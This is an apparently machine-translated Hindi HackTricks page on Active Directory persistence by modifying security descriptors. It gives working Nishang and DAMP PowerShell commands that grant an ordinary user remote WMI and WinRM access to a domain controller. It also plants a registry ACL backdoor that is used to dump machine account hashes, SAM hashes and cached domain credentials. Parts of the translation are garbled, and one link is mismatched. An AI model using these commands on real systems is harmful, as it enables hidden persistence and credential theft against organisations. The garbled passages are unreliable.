# सुरक्षा विवरण

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सदस्यता योजनाएं देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें, HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके।

</details>

## सुरक्षा विवरण

[दस्तावेज़ से](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): सुरक्षा विवरण परिभाषा भाषा (SDDL) उस प्रारूप को परिभाषित करता है जिसका उपयोग सुरक्षा विवरण को वर्णित करने के लिए किया जाता है। SDDL डेकल और SACL के लिए ACE स्ट्रिंग का उपयोग करता है: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

**सुरक्षा विवरण** का उपयोग **अन्य वस्तुओं** पर **वस्तु** के **अधिकार** संग्रहित करने के लिए किया जाता है। यदि आप किसी वस्तु के सुरक्षा विवरण में केवल **थोड़ा सा परिवर्तन** कर सकते हैं, तो आप उस वस्तु पर बहुत दिलचस्प विशेषाधिकार प्राप्त कर सकते हैं जिसके लिए आपको किसी विशेषाधिकृत समूह के सदस्य होने की आवश्यकता नहीं है।

फिर, यह स्थायित्व तकनीक उस क्षमता पर आधारित है कि विशेष वस्तुओं के खिलाफ आवश्यक प्रत्येक विशेषाधिकार जीतने की क्षमता, एक कार्य को करने की क्षमता होनी चाहिए जो सामान्यत: व्यवस्थापक विशेषाधिकारों की आवश्यकता होती है लेकिन व्यवस्थापक होने की आवश्यकता नहीं है।

### WMI तक पहुंच

आप एक उपयोगकर्ता को **दूरस्थ WMI को क्रियान्वित करने की** अनुमति दे सकते हैं [**इसका उपयोग करके**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### WinRM तक पहुंच

**इसका उपयोग करके** [**एक उपयोगकर्ता को winrm PS कंसोल तक पहुंच दें**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### दूरस्थ पहुंच से हैश तक पहुंच

**रजिस्ट्री** तक पहुंचें और **हैश डंप** बनाएं, [**DAMP**](https://github.com/HarmJ0y/DAMP)** का उपयोग करके** **रेग बैकडोर बनाएं**, ताकि आप किसी भी समय कंप्यूटर के **हैश**, **SAM** और कंप्यूटर में किसी भी **कैश्ड AD** क्रेडेंशियल को पुनः प्राप्त कर सकें। इसलिए, एक **सामान्य उपयोगकर्ता को इस अनुमति को दोमेन कंट्रोलर कंप्यूटर के खिलाफ** देना बहुत उपयुक्त है:
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
जांचें [**सिल्वर टिकट**](silver-ticket.md) कैसे आप डोमेन कंट्रोलर के कंप्यूटर अकाउंट के हैश का उपयोग कर सकते हैं।

<details>

<summary><strong>जानें जीरो से हीरो तक AWS हैकिंग को</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> सीखें!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में** देखना चाहते हैं या **HackTricks को PDF में डाउनलोड** करना चाहते हैं तो [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) जांचें!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**द पीएस फैमिली**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड ग्रुप**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम ग्रुप**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** पर **फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें द्वारा PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>
